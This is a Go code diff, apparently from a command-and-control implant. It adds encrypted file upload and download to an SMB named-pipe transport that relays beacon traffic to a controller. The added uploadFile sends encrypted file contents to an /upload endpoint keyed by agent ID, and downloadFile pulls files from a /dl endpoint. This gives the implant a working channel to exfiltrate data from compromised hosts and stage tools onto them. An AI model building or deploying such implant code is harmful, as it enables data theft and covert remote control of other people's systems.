@@ -8,6 +8,9 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"net/http"
+	"net/url"
+	"path/filepath"
 	"strings"
 	"sync"
 	"syscall"
@@ -136,7 +139,7 @@ func pipeWriteMsg(p *pipeConn, data []byte) error {
 
 type smbClientTransport struct {
 	pipe     *pipeConn
-	pipeName string    // stored for reconnect on registration retry
+	pipeName string // stored for reconnect on registration retry
 	agentID  string
 	aesKey   []byte
 	mu       sync.Mutex // serializes all pipe operations (beacon, result, relay)
@@ -307,10 +310,32 @@ func (t *smbClientTransport) rawForward(method, path string, body []byte) (int, 
 	return r.Status, bodyBytes, nil
 }
 
-func (t *smbClientTransport) uploadFile(_ int64, _ string, _ []byte) error {
-	return fmt.Errorf("SMB: uploadFile not supported")
+func (t *smbClientTransport) uploadFile(taskID int64, filename string, data []byte) error {
+	ciphertext, err := seal(t.aesKey, data)
+	if err != nil {
+		return err
+	}
+	name := url.PathEscape(filepath.Base(filename))
+	path := fmt.Sprintf("/upload/%s/%s?task_id=%d", t.agentID, name, taskID)
+	status, _, err := t.rawForward(http.MethodPost, path, ciphertext)
+	if err != nil {
+		return err
+	}
+	if status != http.StatusOK {
+		return fmt.Errorf("SMB: upload server returned %d", status)
+	}
+	return nil
 }
 
-func (t *smbClientTransport) downloadFile(_ string) ([]byte, error) {
-	return nil, fmt.Errorf("SMB: downloadFile not supported")
+func (t *smbClientTransport) downloadFile(filename string) ([]byte, error) {
+	name := url.PathEscape(filepath.Base(filename))
+	path := fmt.Sprintf("/dl/%s/%s", t.agentID, name)
+	status, ciphertext, err := t.rawForward(http.MethodGet, path, nil)
+	if err != nil {
+		return nil, err
+	}
+	if status != http.StatusOK {
+		return nil, fmt.Errorf("SMB: download server returned %d", status)
+	}
+	return open(t.aesKey, ciphertext)
 }
